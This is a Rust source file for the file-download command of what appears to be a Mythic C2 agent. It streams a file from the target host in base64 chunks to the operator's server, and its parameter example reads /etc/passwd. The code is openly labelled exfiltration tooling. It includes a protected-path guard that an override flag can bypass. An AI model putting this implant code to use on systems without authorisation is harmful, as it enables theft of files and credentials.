//! File download (agent → Mythic) — multi-chunk, streaming.
//!
//! Reads the file in fixed-size chunks from disk and emits one [`TaskDownload`]
//! response per chunk, all sharing a single `file_id`. Mythic reassembles them
//! into a single file on the operator side.
//!
//! Memory usage: bounded to [`DEFAULT_CHUNK_SIZE`] regardless of file size —
//! safe for files larger than available RAM.
//!
//! Multi-response emission: chunk responses are pushed via [`crate::push_extra`]
//! and the agent loop appends them to the next `get_tasking` round. The single
//! `TaskResponse` returned by `handle` is the final summary.
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "path": "/etc/passwd",
//!     "chunk_size": 524288   // optional, bytes (default 512 KiB)
//! }
//! ```
//!
//! Note: `host` used to be a parameter on this command. Mythic's UI
//! already tags downloads with the originating callback's host
//! server-side, so the operator never needs to supply it; we
//! removed it to stop the tasking panel from prompting for it on
//! every `download`.

use std::fs::File;
use std::io::Read;
use std::path::Path;

use base64::Engine;
use mythic::{TaskDownload, TaskMessage, TaskResponse};
use serde::Deserialize;
use uuid::Uuid;

use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};
use crate::push_extra;

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    path: String,
    /// Chunk size in bytes (default 512 KiB). Clamped to [64 KiB, 8 MiB].
    #[serde(default)]
    chunk_size: Option<u32>,
    /// When true, allow exfiltrating system paths (default false).
    #[serde(default)]
    allow_system_path: bool,
}

// ── Constants ───────────────────────────────────────────────

const DEFAULT_CHUNK_SIZE: u32 = 512 * 1024; // 512 KiB
const MIN_CHUNK_SIZE: u32 = 64 * 1024; // 64 KiB
const MAX_CHUNK_SIZE: u32 = 8 * 1024 * 1024; // 8 MiB
/// Hard ceiling on total file size to prevent runaway disk reads.
const MAX_TOTAL_SIZE: u64 = 4 * 1024 * 1024 * 1024; // 4 GiB

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("download parse error: {e}")),
    };

    let path_str = normalize_user_path(&params.path);
    if !params.allow_system_path && is_protected_path(&path_str) {
        return TaskResponse::failed(
            task.id,
            &format!(
                "refusing to download system path {}; set allow_system_path=true to override",
                path_str
            ),
        );
    }

    let path = Path::new(&path_str);
    let filename = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "unknown".into());
    let full_path = display_path(path);

    // 1. Open file and get total size
    let mut file = match File::open(path) {
        Ok(f) => f,
        Err(e) => {
            return TaskResponse::failed(task.id, &format!("read {} failed: {e}", display_path(path)));
        }
    };
    let total_size = match file.metadata() {
        Ok(m) => m.len(),
        Err(e) => {
            return TaskResponse::failed(task.id, &format!("stat {} failed: {e}", display_path(path)));
        }
    };
    if total_size > MAX_TOTAL_SIZE {
        return TaskResponse::failed(
            task.id,
            &format!(
                "file too large: {} bytes (max {}); use a custom stager",
                total_size, MAX_TOTAL_SIZE
            ),
        );
    }

    // 2. Compute chunk params
    let chunk_size = params
        .chunk_size
        .unwrap_or(DEFAULT_CHUNK_SIZE)
        .clamp(MIN_CHUNK_SIZE, MAX_CHUNK_SIZE);
    let total_chunks: u32 = if total_size == 0 {
        1
    } else {
        ((total_size + chunk_size as u64 - 1) / chunk_size as u64) as u32
    };
    let file_id = Uuid::new_v4();

    info!(
        "[download] {} ({} bytes) → {} chunks of {} bytes",
        full_path, total_size, total_chunks, chunk_size
    );

    // 3. Stream-read each chunk, base64-encode, push as extra response.
    //    Single read buffer reused across chunks; no seek (sequential read).
    //    Memory is bounded to ~chunk_size regardless of file size.
    let mut buf = vec![0u8; chunk_size as usize];
    let mut bytes_sent: u64 = 0;
    let mut chunk_num: u32 = 0;

    while bytes_sent < total_size {
        chunk_num += 1;
        // Read up to the buffer's capacity, but never past the end of file.
        let want = ((total_size - bytes_sent) as usize).min(buf.len());
        let mut filled = 0usize;
        while filled < want {
            match file.read(&mut buf[filled..want]) {
                Ok(0) => {
                    // EOF before we hit total_size — file shrank or metadata
                    // was stale. Treat as a clean end-of-transfer.
                    break;
                }
                Ok(n) => filled += n,
                Err(e) => {
                    return TaskResponse::failed(
                        task.id,
                        &format!(
                            "read {} failed at byte {}/{}: {e}",
                            display_path(path),
                            bytes_sent + filled as u64,
                            total_size
                        ),
                    );
                }
            }
        }
        if filled == 0 {
            // Nothing more to send — break the loop cleanly.
            break;
        }

        // chunk_size in TaskDownload is the *uniform* chunk size used to
        // pre-allocate Mythic's reassembly buffer. Sending the actual length
        // of the (potentially smaller) last chunk confuses the server; the
        // value must be the same on every chunk of a given transfer.
        let encoded = base64::engine::general_purpose::STANDARD.encode(&buf[..filled]);
        bytes_sent += filled as u64;
        let is_last = bytes_sent >= total_size;

        // Push the chunk via extras on every iteration, including the last
        // one. Mythic's reassembly is keyed on (task_id, file_id) so the
        // final summary `TaskResponse` (returned below) can carry the
        // completion flag without racing with the chunk push.
        push_extra(TaskResponse {
            task_id: task.id,
            completed: Some(is_last),
            status: Some(if is_last {
                "completed".into()
            } else {
                "processing".into()
            }),
            user_output: None,
            download: Some(TaskDownload {
                total_chunks: Some(total_chunks),
                chunk_size: Some(chunk_size),
                chunk_num: Some(chunk_num),
                chunk_data: Some(encoded),
                filename: Some(filename.clone()),
                full_path: Some(full_path.clone()),
                // host left None — Mythic fills it from the callback
                host: None,
                is_screenshot: false,
                file_id: Some(file_id),
            }),
            ..Default::default()
        });
    }

    // Final summary
    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(format!(
            "{} ({} bytes, {} chunks)",
            filename, total_size, chunk_num
        )),
        ..Default::default()
    }
}
